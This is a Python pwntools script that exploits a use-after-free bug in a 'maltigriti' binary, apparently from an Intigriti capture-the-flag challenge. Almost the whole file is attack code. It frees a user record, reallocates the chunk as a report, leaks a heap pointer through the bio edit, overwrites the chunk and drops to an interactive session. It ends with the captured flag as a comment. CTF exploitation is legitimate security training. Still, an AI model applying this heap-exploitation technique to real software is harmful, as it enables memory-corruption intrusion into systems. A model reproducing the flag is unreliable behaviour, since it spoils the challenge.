```python
from pwn import *

p = process('./maltigriti')
p = remote('maltigriti.ctf.intigriti.io', 1337 )
exe = ELF('./maltigriti')

# gdb.attach(p, gdbscript = '''
# b*register_user+17
# b*edit_user+207
# b*edit_user+62
# b*new_report+25
# b*print_reports+85
# b*print_reports+116
# b*logout+113
# c
# ''')

# input()

def reg(name, pas, size, data):
    p.sendlineafter(b'menu> ', b'0')
    p.sendlineafter(b'name> ', name)
    p.sendlineafter(b'password> ', pas)
    p.sendlineafter(b'bio> ', str(size))
    p.sendlineafter(b'bio> ', data)

def edit(data):
    p.sendlineafter(b'menu> ', b'1')
    p.sendlineafter(b'bio> ', data)

def add(tit, rep):
    p.sendlineafter(b'menu> ', b'2')
    p.sendlineafter(b'title> ', tit)
    p.sendlineafter(b'report> ', rep)

def show():
    p.sendlineafter(b'menu> ', b'3')

def delete():
    p.sendlineafter(b'menu> ', b'6')




reg(b'giabao', b'giabao', 0xc0, b'a')

delete()

add(b'bof', b'bof')
# edit(b'A'*0x50)
p.sendlineafter(b'menu> ', b'1')
p.recvuntil(b'Your current bio is: ')
heap = u64(p.recv(6) + b'\0\0')
print(hex(heap))
p.sendlineafter(b'bio> ', p64(heap) + b'A'*0x50)
show()
p.sendlineafter(b'menu> ', b'4')

p.interactive()

# INTIGRITI{u53_4f73r_fr33_50und5_600d_70_m3}
```
